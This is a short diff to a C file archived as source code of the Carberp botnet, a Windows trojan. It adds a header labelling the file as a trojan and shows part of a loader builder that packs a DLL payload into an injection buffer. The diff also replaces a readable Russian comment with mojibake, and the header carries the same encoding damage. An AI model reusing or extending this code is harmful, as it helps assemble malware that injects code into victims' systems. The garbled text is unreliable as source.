@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <stdio.h>
 #include "sec.h"
@@ -62,7 +73,7 @@ int main(int argc, char* argv[])
 
 	if( dll != 0 && dllLoader != 0 && dllInject != 0 )
 	{
-		//сначала влаживаем dll в dllInject
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll пїЅ dllInject
 		char* data = (char*)LocalAlloc( LMEM_FIXED, szDll + sizeof(int) );
 		*((int*)data) = szDll;
 		memcpy( data + sizeof(int), dll, szDll );
